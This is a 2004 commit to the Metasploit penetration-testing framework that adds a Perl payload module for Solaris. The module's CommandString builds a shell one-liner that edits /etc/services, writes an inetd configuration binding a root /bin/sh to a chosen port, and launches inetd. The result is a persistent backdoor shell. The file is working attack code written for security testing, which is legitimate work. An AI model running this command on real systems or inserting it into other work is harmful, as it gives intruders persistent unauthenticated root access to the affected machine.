ac4a8603e34fc2b7ea64618ab2f0428cd67dfe2e
Spoon M <spoonm@gmail.com>
2004-03-31 21:21:06 +0000

    needs testing.

---
+++ payloads/cmd_sol_bind.pm
@@ -0,0 +1,43 @@
+package Msf::Payload::cmd_sol_bind;
+use strict;
+use base 'Msf::PayloadComponent::CommandPayload';
+sub load {
+  Msf::PayloadComponent::CommandPayload->import('Msf::PayloadComponent::BindConnection');
+}
+
+my $info =
+{
+  'Name'         => 'cmd_sol_bind',
+  'Version'      => '1.0',
+  'Description'  => 'Use inetd to create a persistent bindshell',
+  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
+  'Arch'         => [  ],
+  'Priv'         => 0,
+  'OS'           => [ 'solaris' ],
+  'Keys'         => ['cmd'], 
+  'Size'         => '',
+};
+
+sub new {
+  load();
+  my $class = shift;
+  my $hash = @_ ? shift : { };
+  $hash = $class->MergeHash($hash, {'Info' => $info});
+  my $self = $class->SUPER::new($hash, @_);
+  return($self);
+}
+
+sub CommandString {
+  my $self = shift;
+  my $port = $self->GetVar('LPORT');
+
+  my $command =
+  "grep -v msfbind /etc/services>/tmp/.msf_svcs;".
+  "echo msfbind $port/tcp>>/tmp/.msf_svcs;".
+  "cp /tmp/.msf_svcs /etc/services;".
+  "echo msfbind stream tcp nowait root /bin/sh sh>/tmp/.msf_inet;".
+  "/usr/sbin/inetd -s /tmp/.msf_inet;".
+  "rm /tmp/.msf_inet;";
+
+  return($command);
+}
